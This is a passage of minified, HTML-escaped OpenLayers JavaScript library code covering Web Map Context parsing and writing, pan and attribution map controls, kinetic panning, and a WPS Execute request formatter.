b,c,d={queryable:a.queryable,visibility:a.visibility, maxExtent:a.maxExtent,metadata:OpenLayers.Util.applyDefaults(a.metadata,{styles:a.styles,formats:a.formats,"abstract":a["abstract"],dataURL:a.dataURL}),numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.tileSize?new OpenLayers.Size(a.tileSize.width,a.tileSize.height):void 0,minScale:a.minScale||a.maxScaleDenominator,maxScale:a.maxScale||a.minScaleDenominator,srs:a.srs,dimensions:a.dimensions, metadataURL:a.metadataURL};this.layerOptions&amp;&amp;OpenLayers.Util.applyDefaults(d,this.layerOptions);var e={layers:a.name,transparent:a.transparent,version:a.version};if(a.formats&amp;&amp;0&lt;a.formats.length)for(e.format=a.formats[0].value,b=0,c=a.formats.length;b&lt;c;b++){var f=a.formats[b];if(!0==f.current){e.format=f.value;break}}if(a.styles&amp;&amp;0&lt;a.styles.length)for(b=0,c=a.styles.length;b&lt;c;b++)if(f=a.styles[b],!0==f.current){f.href?e.sld=f.href:f.body?e.sld_body=f.body:e.styles=f.name;break}this.layerParams&amp;&amp; OpenLayers.Util.applyDefaults(e,this.layerParams);b=null;c=a.service;c==OpenLayers.Format.Context.serviceTypes.WFS?(d.strategies=[new OpenLayers.Strategy.BBOX],d.protocol=new OpenLayers.Protocol.WFS({url:a.url,featurePrefix:a.name.split(":")[0],featureType:a.name.split(":").pop()}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.KML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.KML}), b=new OpenLayers.Layer.Vector(a.title||a.name,d)):c==OpenLayers.Format.Context.serviceTypes.GML?(d.strategies=[new OpenLayers.Strategy.Fixed],d.protocol=new OpenLayers.Protocol.HTTP({url:a.url,format:new OpenLayers.Format.GML}),b=new OpenLayers.Layer.Vector(a.title||a.name,d)):a.features?(b=new OpenLayers.Layer.Vector(a.title||a.name,d),b.addFeatures(a.features)):!0!==a.categoryLayer&amp;&amp;(b=new OpenLayers.Layer.WMS(a.title||a.name,a.url,e,d));return b},getLayersFromContext:function(a){for(var b=[],c= 0,d=a.length;c&lt;d;c++){var e=this.getLayerFromContext(a[c]);null!==e&amp;&amp;b.push(e)}return b},contextToMap:function(a,b){b=OpenLayers.Util.applyDefaults({maxExtent:a.maxExtent,projection:a.projection,units:a.units},b);b.maxExtent&amp;&amp;(b.maxResolution=b.maxExtent.getWidth()/OpenLayers.Map.TILE_WIDTH);b.metadata={contactInformation:a.contactInformation,"abstract":a["abstract"],keywords:a.keywords,logo:a.logo,descriptionURL:a.descriptionURL};var c=new OpenLayers.Map(b);c.addLayers(this.getLayersFromContext(a.layersContext)); c.setCenter(a.bounds.getCenterLonLat(),c.getZoomForExtent(a.bounds,!0));return c},mergeContextToMap:function(a,b){b.addLayers(this.getLayersFromContext(a.layersContext));return b},write:function(a,b){a=this.toContext(a);return OpenLayers.Format.XML.VersionedOGC.prototype.write.apply(this,arguments)},CLASS_NAME:"OpenLayers.Format.Context"}); OpenLayers.Format.Context.serviceTypes={WMS:"urn:ogc:serviceType:WMS",WFS:"urn:ogc:serviceType:WFS",WCS:"urn:ogc:serviceType:WCS",GML:"urn:ogc:serviceType:GML",SLD:"urn:ogc:serviceType:SLD",FES:"urn:ogc:serviceType:FES",KML:"urn:ogc:serviceType:KML"};OpenLayers.Format.WMC=OpenLayers.Class(OpenLayers.Format.Context,{defaultVersion:"1.1.0",layerToContext:function(a){var b=this.getParser(),c={queryable:a.queryable,visibility:a.visibility,name:a.params.LAYERS,title:a.name,"abstract":a.metadata["abstract"],dataURL:a.metadata.dataURL,metadataURL:a.metadataURL,server:{version:a.params.VERSION,url:a.url},maxExtent:a.maxExtent,transparent:a.params.TRANSPARENT,numZoomLevels:a.numZoomLevels,units:a.units,isBaseLayer:a.isBaseLayer,opacity:1==a.opacity?void 0: a.opacity,displayInLayerSwitcher:a.displayInLayerSwitcher,singleTile:a.singleTile,tileSize:a.singleTile||!a.tileSize?void 0:{width:a.tileSize.w,height:a.tileSize.h},minScale:a.options.resolutions||a.options.scales||a.options.maxResolution||a.options.minScale?a.minScale:void 0,maxScale:a.options.resolutions||a.options.scales||a.options.minResolution||a.options.maxScale?a.maxScale:void 0,formats:[],styles:[],srs:a.srs,dimensions:a.dimensions};a.metadata.servertitle&amp;&amp;(c.server.title=a.metadata.servertitle); if(a.metadata.formats&amp;&amp;0&lt;a.metadata.formats.length)for(var d=0,e=a.metadata.formats.length;d&lt;e;d++){var f=a.metadata.formats[d];c.formats.push({value:f.value,current:f.value==a.params.FORMAT})}else c.formats.push({value:a.params.FORMAT,current:!0});if(a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length)for(d=0,e=a.metadata.styles.length;d&lt;e;d++)b=a.metadata.styles[d],b.current=b.href==a.params.SLD||b.body==a.params.SLD_BODY||b.name==a.params.STYLES?!0:!1,c.styles.push(b);else c.styles.push({href:a.params.SLD, body:a.params.SLD_BODY,name:a.params.STYLES||b.defaultStyleName,title:b.defaultStyleTitle,current:!0});return c},toContext:function(a){var b={},c=a.layers;if("OpenLayers.Map"==a.CLASS_NAME){var d=a.metadata||{};b.size=a.getSize();b.bounds=a.getExtent();b.projection=a.projection;b.title=a.title;b.keywords=d.keywords;b["abstract"]=d["abstract"];b.logo=d.logo;b.descriptionURL=d.descriptionURL;b.contactInformation=d.contactInformation;b.maxExtent=a.maxExtent}else OpenLayers.Util.applyDefaults(b,a),void 0!= b.layers&amp;&amp;delete b.layers;void 0==b.layersContext&amp;&amp;(b.layersContext=[]);if(void 0!=c&amp;&amp;OpenLayers.Util.isArray(c))for(a=0,d=c.length;a&lt;d;a++){var e=c[a];e instanceof OpenLayers.Layer.WMS&amp;&amp;b.layersContext.push(this.layerToContext(e))}return b},CLASS_NAME:"OpenLayers.Format.WMC"});OpenLayers.Format.WMC.v1=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{ol:"http://openlayers.org/context",wmc:"http://www.opengis.net/context",sld:"http://www.opengis.net/sld",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},schemaLocation:"",getNamespacePrefix:function(a){var b=null;if(null==a)b=this.namespaces[this.defaultPrefix];else for(b in this.namespaces)if(this.namespaces[b]==a)break;return b},defaultPrefix:"wmc",rootPrefix:null,defaultStyleName:"", defaultStyleTitle:"Default",initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a=a.documentElement;this.rootPrefix=a.prefix;var b={version:a.getAttribute("version")};this.runChildNodes(b,a);return b},runChildNodes:function(a,b){for(var c=b.childNodes,d,e,f,g=0,h=c.length;g&lt;h;++g)d=c[g],1==d.nodeType&amp;&amp;(e=this.getNamespacePrefix(d.namespaceURI),f=d.nodeName.split(":").pop(), (e=this["read_"+e+"_"+f])&amp;&amp;e.apply(this,[a,d]))},read_wmc_General:function(a,b){this.runChildNodes(a,b)},read_wmc_BoundingBox:function(a,b){a.projection=b.getAttribute("SRS");a.bounds=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"))},read_wmc_LayerList:function(a,b){a.layersContext=[];this.runChildNodes(a,b)},read_wmc_Layer:function(a,b){var c={visibility:"1"!=b.getAttribute("hidden"),queryable:"1"==b.getAttribute("queryable"),formats:[], styles:[],metadata:{}};this.runChildNodes(c,b);a.layersContext.push(c)},read_wmc_Extension:function(a,b){this.runChildNodes(a,b)},read_ol_units:function(a,b){a.units=this.getChildValue(b)},read_ol_maxExtent:function(a,b){var c=new OpenLayers.Bounds(b.getAttribute("minx"),b.getAttribute("miny"),b.getAttribute("maxx"),b.getAttribute("maxy"));a.maxExtent=c},read_ol_transparent:function(a,b){a.transparent=this.getChildValue(b)},read_ol_numZoomLevels:function(a,b){a.numZoomLevels=parseInt(this.getChildValue(b))}, read_ol_opacity:function(a,b){a.opacity=parseFloat(this.getChildValue(b))},read_ol_singleTile:function(a,b){a.singleTile="true"==this.getChildValue(b)},read_ol_tileSize:function(a,b){var c={width:b.getAttribute("width"),height:b.getAttribute("height")};a.tileSize=c},read_ol_isBaseLayer:function(a,b){a.isBaseLayer="true"==this.getChildValue(b)},read_ol_displayInLayerSwitcher:function(a,b){a.displayInLayerSwitcher="true"==this.getChildValue(b)},read_wmc_Server:function(a,b){a.version=b.getAttribute("version"); a.url=this.getOnlineResource_href(b);a.metadata.servertitle=b.getAttribute("title")},read_wmc_FormatList:function(a,b){this.runChildNodes(a,b)},read_wmc_Format:function(a,b){var c={value:this.getChildValue(b)};"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.formats.push(c)},read_wmc_StyleList:function(a,b){this.runChildNodes(a,b)},read_wmc_Style:function(a,b){var c={};this.runChildNodes(c,b);"1"==b.getAttribute("current")&amp;&amp;(c.current=!0);a.styles.push(c)},read_wmc_SLD:function(a,b){this.runChildNodes(a, b)},read_sld_StyledLayerDescriptor:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_sld_FeatureTypeStyle:function(a,b){var c=OpenLayers.Format.XML.prototype.write.apply(this,[b]);a.body=c},read_wmc_OnlineResource:function(a,b){a.href=this.getAttributeNS(b,this.namespaces.xlink,"href")},read_wmc_Name:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.name=c)},read_wmc_Title:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.title=c)},read_wmc_MetadataURL:function(a, b){a.metadataURL=this.getOnlineResource_href(b)},read_wmc_KeywordList:function(a,b){a.keywords=[];this.runChildNodes(a.keywords,b)},read_wmc_Keyword:function(a,b){a.push(this.getChildValue(b))},read_wmc_Abstract:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a["abstract"]=c)},read_wmc_LogoURL:function(a,b){a.logo={width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"),href:this.getOnlineResource_href(b)}},read_wmc_DescriptionURL:function(a,b){a.descriptionURL= this.getOnlineResource_href(b)},read_wmc_ContactInformation:function(a,b){var c={};this.runChildNodes(c,b);a.contactInformation=c},read_wmc_ContactPersonPrimary:function(a,b){var c={};this.runChildNodes(c,b);a.personPrimary=c},read_wmc_ContactPerson:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.person=c)},read_wmc_ContactOrganization:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.organization=c)},read_wmc_ContactPosition:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.position=c)},read_wmc_ContactAddress:function(a, b){var c={};this.runChildNodes(c,b);a.contactAddress=c},read_wmc_AddressType:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.type=c)},read_wmc_Address:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.address=c)},read_wmc_City:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.city=c)},read_wmc_StateOrProvince:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.stateOrProvince=c)},read_wmc_PostCode:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.postcode=c)},read_wmc_Country:function(a,b){var c=this.getChildValue(b); c&amp;&amp;(a.country=c)},read_wmc_ContactVoiceTelephone:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.phone=c)},read_wmc_ContactFacsimileTelephone:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.fax=c)},read_wmc_ContactElectronicMailAddress:function(a,b){var c=this.getChildValue(b);c&amp;&amp;(a.email=c)},read_wmc_DataURL:function(a,b){a.dataURL=this.getOnlineResource_href(b)},read_wmc_LegendURL:function(a,b){var c={width:b.getAttribute("width"),height:b.getAttribute("height"),format:b.getAttribute("format"), href:this.getOnlineResource_href(b)};a.legend=c},read_wmc_DimensionList:function(a,b){a.dimensions={};this.runChildNodes(a.dimensions,b)},read_wmc_Dimension:function(a,b){var c={name:b.getAttribute("name").toLowerCase(),units:b.getAttribute("units")||"",unitSymbol:b.getAttribute("unitSymbol")||"",userValue:b.getAttribute("userValue")||"",nearestValue:"1"===b.getAttribute("nearestValue"),multipleValues:"1"===b.getAttribute("multipleValues"),current:"1"===b.getAttribute("current"),"default":b.getAttribute("default")|| ""},d=this.getChildValue(b);c.values=d.split(",");a[c.name]=c},write:function(a,b){var c=this.createElementDefaultNS("ViewContext");this.setAttributes(c,{version:this.VERSION,id:b&amp;&amp;"string"==typeof b.id?b.id:OpenLayers.Util.createUniqueID("OpenLayers_Context_")});this.setAttributeNS(c,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);c.appendChild(this.write_wmc_General(a));c.appendChild(this.write_wmc_LayerList(a));return OpenLayers.Format.XML.prototype.write.apply(this,[c])},createElementDefaultNS:function(a, b,c){a=this.createElementNS(this.namespaces[this.defaultPrefix],a);b&amp;&amp;a.appendChild(this.createTextNode(b));c&amp;&amp;this.setAttributes(a,c);return a},setAttributes:function(a,b){var c,d;for(d in b)c=b[d].toString(),c.match(/[A-Z]/)?this.setAttributeNS(a,null,d,c):a.setAttribute(d,c)},write_wmc_General:function(a){var b=this.createElementDefaultNS("General");a.size&amp;&amp;b.appendChild(this.createElementDefaultNS("Window",null,{width:a.size.w,height:a.size.h}));var c=a.bounds;b.appendChild(this.createElementDefaultNS("BoundingBox", null,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18),maxy:c.top.toPrecision(18),SRS:a.projection}));b.appendChild(this.createElementDefaultNS("Title",a.title));a.keywords&amp;&amp;b.appendChild(this.write_wmc_KeywordList(a.keywords));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.logo&amp;&amp;b.appendChild(this.write_wmc_URLType("LogoURL",a.logo.href,a.logo));a.descriptionURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DescriptionURL",a.descriptionURL)); a.contactInformation&amp;&amp;b.appendChild(this.write_wmc_ContactInformation(a.contactInformation));b.appendChild(this.write_ol_MapExtension(a));return b},write_wmc_KeywordList:function(a){for(var b=this.createElementDefaultNS("KeywordList"),c=0,d=a.length;c&lt;d;c++)b.appendChild(this.createElementDefaultNS("Keyword",a[c]));return b},write_wmc_ContactInformation:function(a){var b=this.createElementDefaultNS("ContactInformation");a.personPrimary&amp;&amp;b.appendChild(this.write_wmc_ContactPersonPrimary(a.personPrimary)); a.position&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPosition",a.position));a.contactAddress&amp;&amp;b.appendChild(this.write_wmc_ContactAddress(a.contactAddress));a.phone&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactVoiceTelephone",a.phone));a.fax&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactFacsimileTelephone",a.fax));a.email&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactElectronicMailAddress",a.email));return b},write_wmc_ContactPersonPrimary:function(a){var b=this.createElementDefaultNS("ContactPersonPrimary"); a.person&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactPerson",a.person));a.organization&amp;&amp;b.appendChild(this.createElementDefaultNS("ContactOrganization",a.organization));return b},write_wmc_ContactAddress:function(a){var b=this.createElementDefaultNS("ContactAddress");a.type&amp;&amp;b.appendChild(this.createElementDefaultNS("AddressType",a.type));a.address&amp;&amp;b.appendChild(this.createElementDefaultNS("Address",a.address));a.city&amp;&amp;b.appendChild(this.createElementDefaultNS("City",a.city));a.stateOrProvince&amp;&amp; b.appendChild(this.createElementDefaultNS("StateOrProvince",a.stateOrProvince));a.postcode&amp;&amp;b.appendChild(this.createElementDefaultNS("PostCode",a.postcode));a.country&amp;&amp;b.appendChild(this.createElementDefaultNS("Country",a.country));return b},write_ol_MapExtension:function(a){var b=this.createElementDefaultNS("Extension");if(a=a.maxExtent){var c=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(c,{minx:a.left.toPrecision(18),miny:a.bottom.toPrecision(18),maxx:a.right.toPrecision(18), maxy:a.top.toPrecision(18)});b.appendChild(c)}return b},write_wmc_LayerList:function(a){for(var b=this.createElementDefaultNS("LayerList"),c=0,d=a.layersContext.length;c&lt;d;++c)b.appendChild(this.write_wmc_Layer(a.layersContext[c]));return b},write_wmc_Layer:function(a){var b=this.createElementDefaultNS("Layer",null,{queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1"});b.appendChild(this.write_wmc_Server(a));b.appendChild(this.createElementDefaultNS("Name",a.name));b.appendChild(this.createElementDefaultNS("Title", a.title));a["abstract"]&amp;&amp;b.appendChild(this.createElementDefaultNS("Abstract",a["abstract"]));a.dataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("DataURL",a.dataURL));a.metadataURL&amp;&amp;b.appendChild(this.write_wmc_URLType("MetadataURL",a.metadataURL));return b},write_wmc_LayerExtension:function(a){var b=this.createElementDefaultNS("Extension"),c=a.maxExtent,d=this.createElementNS(this.namespaces.ol,"ol:maxExtent");this.setAttributes(d,{minx:c.left.toPrecision(18),miny:c.bottom.toPrecision(18),maxx:c.right.toPrecision(18), maxy:c.top.toPrecision(18)});b.appendChild(d);a.tileSize&amp;&amp;!a.singleTile&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:tileSize"),this.setAttributes(c,a.tileSize),b.appendChild(c));for(var c="transparent numZoomLevels units isBaseLayer opacity displayInLayerSwitcher singleTile".split(" "),e=0,f=c.length;e&lt;f;++e)(d=this.createOLPropertyNode(a,c[e]))&amp;&amp;b.appendChild(d);return b},createOLPropertyNode:function(a,b){var c=null;null!=a[b]&amp;&amp;(c=this.createElementNS(this.namespaces.ol,"ol:"+b),c.appendChild(this.createTextNode(a[b].toString()))); return c},write_wmc_Server:function(a){a=a.server;var b=this.createElementDefaultNS("Server"),c={service:"OGC:WMS",version:a.version};a.title&amp;&amp;(c.title=a.title);this.setAttributes(b,c);b.appendChild(this.write_wmc_OnlineResource(a.url));return b},write_wmc_URLType:function(a,b,c){a=this.createElementDefaultNS(a);a.appendChild(this.write_wmc_OnlineResource(b));if(c){b=["width","height","format"];for(var d=0;d&lt;b.length;d++)b[d]in c&amp;&amp;a.setAttribute(b[d],c[b[d]])}return a},write_wmc_DimensionList:function(a){var b= this.createElementDefaultNS("DimensionList"),c;for(c in a.dimensions){var d={},e=a.dimensions[c],f;for(f in e)d[f]="boolean"==typeof e[f]?Number(e[f]):e[f];e="";d.values&amp;&amp;(e=d.values.join(","),delete d.values);b.appendChild(this.createElementDefaultNS("Dimension",e,d))}return b},write_wmc_FormatList:function(a){for(var b=this.createElementDefaultNS("FormatList"),c=0,d=a.formats.length;c&lt;d;c++){var e=a.formats[c];b.appendChild(this.createElementDefaultNS("Format",e.value,e.current&amp;&amp;!0==e.current?{current:"1"}: null))}return b},write_wmc_StyleList:function(a){var b=this.createElementDefaultNS("StyleList");if((a=a.styles)&amp;&amp;OpenLayers.Util.isArray(a))for(var c,d=0,e=a.length;d&lt;e;d++){var f=a[d],g=this.createElementDefaultNS("Style",null,f.current&amp;&amp;!0==f.current?{current:"1"}:null);f.href?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL", f.legend.href,f.legend)),f=this.write_wmc_OnlineResource(f.href),c.appendChild(f),g.appendChild(c)):f.body?(c=this.createElementDefaultNS("SLD"),f.name&amp;&amp;c.appendChild(this.createElementDefaultNS("Name",f.name)),f.title&amp;&amp;c.appendChild(this.createElementDefaultNS("Title",f.title)),f.legend&amp;&amp;c.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)),f=OpenLayers.Format.XML.prototype.read.apply(this,[f.body]).documentElement,c.ownerDocument&amp;&amp;c.ownerDocument.importNode&amp;&amp;(f=c.ownerDocument.importNode(f, !0)),c.appendChild(f),g.appendChild(c)):(g.appendChild(this.createElementDefaultNS("Name",f.name)),g.appendChild(this.createElementDefaultNS("Title",f.title)),f["abstract"]&amp;&amp;g.appendChild(this.createElementDefaultNS("Abstract",f["abstract"])),f.legend&amp;&amp;g.appendChild(this.write_wmc_URLType("LegendURL",f.legend.href,f.legend)));b.appendChild(g)}return b},write_wmc_OnlineResource:function(a){var b=this.createElementDefaultNS("OnlineResource");this.setAttributeNS(b,this.namespaces.xlink,"xlink:type", "simple");this.setAttributeNS(b,this.namespaces.xlink,"xlink:href",a);return b},getOnlineResource_href:function(a){var b={};a=a.getElementsByTagName("OnlineResource");0&lt;a.length&amp;&amp;this.read_wmc_OnlineResource(b,a[0]);return b.href},CLASS_NAME:"OpenLayers.Format.WMC.v1"});OpenLayers.Control.PanPanel=OpenLayers.Class(OpenLayers.Control.Panel,{slideFactor:50,slideRatio:null,initialize:function(a){OpenLayers.Control.Panel.prototype.initialize.apply(this,[a]);a={slideFactor:this.slideFactor,slideRatio:this.slideRatio};this.addControls([new OpenLayers.Control.Pan(OpenLayers.Control.Pan.NORTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.SOUTH,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.EAST,a),new OpenLayers.Control.Pan(OpenLayers.Control.Pan.WEST,a)])}, CLASS_NAME:"OpenLayers.Control.PanPanel"});OpenLayers.Control.Attribution=OpenLayers.Class(OpenLayers.Control,{separator:", ",template:"${layers}",destroy:function(){this.map.events.un({removelayer:this.updateAttribution,addlayer:this.updateAttribution,changelayer:this.updateAttribution,changebaselayer:this.updateAttribution,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.map.events.on({changebaselayer:this.updateAttribution,changelayer:this.updateAttribution, addlayer:this.updateAttribution,removelayer:this.updateAttribution,scope:this});this.updateAttribution();return this.div},updateAttribution:function(){var a=[];if(this.map&amp;&amp;this.map.layers){for(var b=0,c=this.map.layers.length;b&lt;c;b++){var d=this.map.layers[b];d.attribution&amp;&amp;d.getVisibility()&amp;&amp;-1===OpenLayers.Util.indexOf(a,d.attribution)&amp;&amp;a.push(d.attribution)}this.div.innerHTML=OpenLayers.String.format(this.template,{layers:a.join(this.separator)})}},CLASS_NAME:"OpenLayers.Control.Attribution"});OpenLayers.Kinetic=OpenLayers.Class({threshold:0,deceleration:0.0035,nbPoints:100,delay:200,points:void 0,timerId:void 0,initialize:function(a){OpenLayers.Util.extend(this,a)},begin:function(){OpenLayers.Animation.stop(this.timerId);this.timerId=void 0;this.points=[]},update:function(a){this.points.unshift({xy:a,tick:(new Date).getTime()});this.points.length>this.nbPoints&amp;&amp;this.points.pop()},end:function(a){for(var b,c=(new Date).getTime(),d=0,e=this.points.length,f;d&lt;e;d++){f=this.points[d];if(c- f.tick>this.delay)break;b=f}if(b&amp;&amp;(d=(new Date).getTime()-b.tick,c=Math.sqrt(Math.pow(a.x-b.xy.x,2)+Math.pow(a.y-b.xy.y,2)),d=c/d,!(0==d||d&lt;this.threshold)))return c=Math.asin((a.y-b.xy.y)/c),b.xy.x&lt;=a.x&amp;&amp;(c=Math.PI-c),{speed:d,theta:c}},move:function(a,b){var c=a.speed,d=Math.cos(a.theta),e=-Math.sin(a.theta),f=(new Date).getTime(),g=0,h=0;this.timerId=OpenLayers.Animation.start(OpenLayers.Function.bind(function(){if(null!=this.timerId){var a=(new Date).getTime()-f,l=-this.deceleration*Math.pow(a, 2)/2+c*a,m=l*d,l=l*e,n,p;n=!1;0>=-this.deceleration*a+c&amp;&amp;(OpenLayers.Animation.stop(this.timerId),this.timerId=null,n=!0);a=m-g;p=l-h;g=m;h=l;b(a,p,n)}},this))},CLASS_NAME:"OpenLayers.Kinetic"});OpenLayers.Format.WPSExecute=OpenLayers.Class(OpenLayers.Format.XML,OpenLayers.Format.Filter.v1_1_0,{namespaces:{ows:"http://www.opengis.net/ows/1.1",gml:"http://www.opengis.net/gml",wps:"http://www.opengis.net/wps/1.0.0",wfs:"http://www.opengis.net/wfs",ogc:"http://www.opengis.net/ogc",wcs:"http://www.opengis.net/wcs",xlink:"http://www.w3.org/1999/xlink",xsi:"http://www.w3.org/2001/XMLSchema-instance"},regExes:{trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g},VERSION:"1.0.0", schemaLocation:"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd",schemaLocationAttr:function(a){},write:function(a){var b;window.ActiveXObject?this.xmldom=b=new ActiveXObject("Microsoft.XMLDOM"):b=document.implementation.createDocument("","",null);a=this.writeNode("wps:Execute",a,b);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])},read:function(a){"string"==typeof a&amp;&amp;(a= OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a,b);return b},writers:{wps:{Execute:function(a){var b=this.createElementNSPlus("wps:Execute",{attributes:{version:this.VERSION,service:"WPS"}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("wps:DataInputs",a.dataInputs,b);this.writeNode("wps:ResponseForm",a.responseForm,b);return b},ResponseForm:function(a){var b=this.createElementNSPlus("wps:ResponseForm",{});a.rawDataOutput&amp;&amp; this.writeNode("wps:RawDataOutput",a.rawDataOutput,b);a.responseDocument&amp;&amp;this.writeNode("wps:ResponseDocument",a.responseDocument,b);return b},ResponseDocument:function(a){var b=this.createElementNSPlus("wps:ResponseDocument",{attributes:{storeExecuteResponse:a.storeExecuteResponse,lineage:a.lineage,status:a.status}});if(a.outputs)for(var c=0,d=a.outputs.length;c&lt;d;c++)this.writeNode("wps:Output",a.outputs[c],b);return b},Output:function(a){var b=this.createElementNSPlus("wps:Output",{attributes:{asReference:a.asReference, mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode("ows:Identifier",a.identifier,b);this.writeNode("ows:Title",a.title,b);this.writeNode("ows:Abstract",a["abstract"],b);return b},RawDataOutput:function(a){var b=this.createElementNSPlus("wps:RawDataOutput",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}});this.writeNode("ows:Identifier",a.identifier,b);return b},DataInputs:function(a){for(var b=this.createElementNSPlus("wps:DataInputs",{}),c=0,d=a.length;c&lt; d;++c)this.writeNode("wps:Input",a[c],b);return b},Input:function(a){var b=this.createElementNSPlus("wps:Input",{});this.writeNode("ows:Identifier",a.identifier,b);a.title&amp;&amp;this.writeNode("ows:Title",a.title,b);a.data&amp;&amp;this.writeNode("wps:Data",a.data,b);a.reference&amp;&amp;this.writeNode("wps:Reference",a.reference,b);a.boundingBoxData&amp;&amp;this.writeNode("wps:BoundingBoxData",a.boundingBoxData,b);return b},Data:function(a){var b=this.createElementNSPlus("wps:Data",{});a.literalData?this.writeNode("wps:LiteralData", a.literalData,b):a.complexData?this.writeNode("wps:ComplexData",a.complexData,b):a.boundingBoxData&amp;&amp;this.writeNode("ows:BoundingBox",a.boundingBoxData,b);return b},LiteralData:function(a){return this.createElementNSPlus("wps:LiteralData",{attributes:{uom:a.uom},value:a.value})},ComplexData:function(a){var b=this.createElementNSPlus("wps:ComplexData",{attributes:{mimeType:a.mimeType,encoding:a.encoding,schema:a.schema}}),c=a.value;"string"===typeof c?b.appendChild(this.getXMLDoc().createCDATASection(a.value)): b.appendChild(c);return b},Reference:function(a){var b=this.createElementNSPlus("wps:Reference",{attributes:{mimeType:a.mimeType,"xlink:href":a.href,method:a.method,encoding:a.encoding,schema:a.schema}});a.body&amp;&amp;this.writeNode("wps:Body",a.body,b);return b},BoundingBoxData:function(a,b){this.writers.ows.BoundingBox.apply(this,[a,b,"wps:BoundingBoxData"])},Body:function(a){var b=this.createElementNSPlus("wps:Body",{});a.wcs?this.writeNode("wcs:GetCoverage",a.wcs,b):a.wfs?(this.featureType=a.wfs.featureType, this.version=a.wfs.version,this.writeNode("wfs:GetFeature",a.wfs,b)):this.writeNode("wps:Execute",a,b);return b}},wcs:OpenLayers.Format.WCSGetCoverage.prototype.writers.wcs,wfs:OpenLayers.Format.WFST.v1_1_0.prototype.writers.wfs,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc,ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.writers.ows},readers:{wps:{ExecuteResponse:function(a,b){b.executeResponse={lang:a.getAttribute("lang"),statusLocation:a.getAttribute("statusLocation"),serviceInstance:a.getAttribute("serviceInstance"), service:a.getAttribute("service")};this.readChildNodes(a,b.executeResponse)},Process:function(a,b){b.process={};this.readChildNodes(a,b.process)},Status:function(a,b){b.status={creationTime:a.getAttribute("creationTime")};this.readChildNodes(a,b.status)},ProcessSucceeded:function(a,b){b.processSucceeded=!0},ProcessOutputs:function(a,b){b.processOutputs=[];this.readChildNodes(a,b.processOutputs)},Output:function(a,b){var c={};this.readChildNodes(a,c);b.push(c)},Reference:function(a,b){b.reference= 